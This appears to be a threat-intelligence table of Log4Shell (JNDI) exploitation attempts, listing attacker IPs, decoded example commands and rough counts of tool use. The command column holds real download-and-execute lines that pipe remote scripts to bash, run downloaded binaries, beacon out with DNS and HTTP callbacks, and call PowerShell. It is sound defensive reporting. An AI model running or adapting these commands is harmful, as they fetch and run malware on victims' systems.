JNDI Referenced Suspicious IP	Suspicious Behavior	Example Command/Download	Count of IP seen with JNDI Base64 encoded curl	Count of IP seen with JNDI Base64 encoded wget	Count of IP seen with JNDI Base64 encoded telnet	Count of IP seen with JNDI Base64 encoded nc	Count of IP seen with JNDI Base64 encoded dig	Count of IP seen with JNDI Base64 encoded RCE attempt	Count of IP seen with JNDI Base64 encoded Powershell	Count of IP seen with JNDI Reverse Shell
45.155.205.233	Mass Scanning with Base64 encoded curl, wget, and local execution	(curl -s 45.155[.]205.233:5874/<redacted victim ip>:80||wget -q -O- 45[.]155.205.233:5874/<redacted victim ip>:80)|bash	<10000	<10000				<10000		
195.54.160.149	Mass Scanning with Base64 encoded curl, wget, and local execution	(curl -s 195[.]54.160.149:5874/<redacted victim ip>:80||wget -q -O- 195[.]54.160.149:5874/<redacted victim ip>:80)|bash	<10000	<10000				<10000		
135.148.143.217	Remote Code Download and Execution with Base64 encoded command	wget http[:]//152[.]67.63.150/py; curl -O http[:]//152[.]67.63.150/py; chmod 777 py; ./py rce.x86	<1000	<1000				<100		
45.137.21.9	Remote Code Download and Execution with Base64 encoded command	wget http[:]//62[.]210.130.250/lh.sh;chmod +x lh.sh;./lh.sh	<10	<1000				<1000		
81.30.157.43	Download and execute with double Base64 encoded command	cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http[:]//155[.]94.154.170/aaa;curl -O http[:]//155[.]94.154.170/aaa;chmod 777 aaa;./aaa	<100	<100				<10		
165.22.213.147	Reconnaissance with Base64 encoded interactsh token	dig <redacted victim ip>.$(whoami).$(hostname).<redacted token>.interact[.]sh	<10			1	<100	<10		
135.148.132.224	Remote Code Download and Execution with Base64 encoded command	wget http://152[.]67.63.150/py; curl -O http://152[.]67.63.150/py; chmod 777 py; ./py rce.x86	<100	<100				<10		
52.140.215.233	LIVE Remote Code Download and Execution with Base64 encoded command	cd /tmp;wget http[:]//155[.]94.154.170/aaa;curl -O http[:]//155[.]94.154.170/aaa;chmod +x aaa;./aaa	<100	<100						
37.233.99.127	Reconnaissance with Base64 encoded burpcollaborator token	curl <redacted innocuous domain>.<redacted token>.burpcollaborator[.]net/only_testing_plz_bug_bounty_xDDDD_joke	<100							
45.79.91.18	Reconnaissance with Base64 encoded command	curl http[:]//<redacted innocuous domain>.<redacted token>.burpcollaborator[.]net/	<100							
103.104.73.155	LIVE Remote Code Download and Execution with Base64 encoded command	(wget -O - http[:]//103[.]104.73.155:8002/acc||curl -o - http[:]//103[.]104.73.155:8002/acc)|/bin/bash	<10	<10				<10		
45.33.47.240	Reconnaissance with Base64 encoded command	curl http[:]//<redacted innocuous domain>.<redacted token>.interact[.]sh/	<100							
79.172.214.11	Remote Code Download and Execution with Base64 encoded command	curl 135[.]125.217.87/jndi.sh | bash	<10	1				<10		
192.210.200.66	Remote Code Download and Execution with Base64 encoded command	(curl -fsSL http://192[.]210.200.66:1234/xmss||wget -q -O - http://192[.]210.200.66:1234/xmss)|bash	<10	<10				<10		
167.86.70.252	Remote Code Download and Execution with Base64 encoded Powershell	cmd.exe /c powershell.exe -c Invoke-WebRequest http[:]//177[.]52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php	<10	<10				1	1	
